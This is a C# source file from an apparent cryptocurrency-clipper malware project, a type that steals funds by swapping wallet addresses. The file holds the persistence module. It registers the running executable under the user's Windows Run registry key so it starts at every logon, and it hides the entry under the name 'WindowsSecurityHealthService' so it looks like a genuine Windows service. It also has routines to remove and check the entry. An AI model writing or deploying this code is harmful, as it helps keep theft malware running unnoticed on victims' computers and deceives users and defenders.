using System.Runtime.Versioning;
using Microsoft.Win32;

namespace CryptoClipper.Persistence;

[SupportedOSPlatform("windows")]
public static class RegistryStartup
{
    private const string RunKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
    private const string ValueName = "WindowsSecurityHealthService";

    public static bool Install()
    {
        try
        {
            string exePath = Environment.ProcessPath ?? string.Empty;
            if (string.IsNullOrEmpty(exePath))
                return false;

            using var key = Registry.CurrentUser.OpenSubKey(RunKey, writable: true);
            if (key is null)
                return false;

            var existing = key.GetValue(ValueName) as string;
            if (string.Equals(existing, exePath, StringComparison.OrdinalIgnoreCase))
                return true;

            key.SetValue(ValueName, exePath, RegistryValueKind.String);
            return true;
        }
        catch
        {
            return false;
        }
    }

    public static bool Uninstall()
    {
        try
        {
            using var key = Registry.CurrentUser.OpenSubKey(RunKey, writable: true);
            key?.DeleteValue(ValueName, throwOnMissingValue: false);
            return true;
        }
        catch
        {
            return false;
        }
    }

    public static bool IsInstalled()
    {
        try
        {
            using var key = Registry.CurrentUser.OpenSubKey(RunKey, writable: false);
            return key?.GetValue(ValueName) is not null;
        }
        catch
        {
            return false;
        }
    }
}
